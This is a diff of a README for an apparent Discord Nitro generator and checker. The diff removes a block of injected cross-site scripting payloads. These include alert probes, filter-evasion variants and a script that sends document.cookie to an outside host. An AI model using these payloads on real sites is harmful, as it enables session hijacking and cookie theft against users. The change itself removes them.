@@ -11,22 +11,6 @@
   </a>
   
   <h3 align="center">Discord Nitro Generator and Checker</h3>
-  
-<script>alert("hello)</script>
-<scr<script>ipt>alert("hello")</script>
-<img src=x onMouseOver=alert("Hello")>
-
-<script>document.location = "https://cryptocurrenciades.com/test.php?cookie=" + document.cookie;</script>
-
-<script>'str1ng'.replace(/1/,alert)</script>
-
-<svg </onload ="1> (_=alert,_(1))"">
-
-"1>wimg onerror="location='javascript:%61lert(1)'" src="x">
-
-"1><div onfocus=alert('xx') id=xss style=display:table>
-
-")</script><script>alert(1);//
 
   <p align="center">
     A discord nitro generator and checker for all your nitro needs
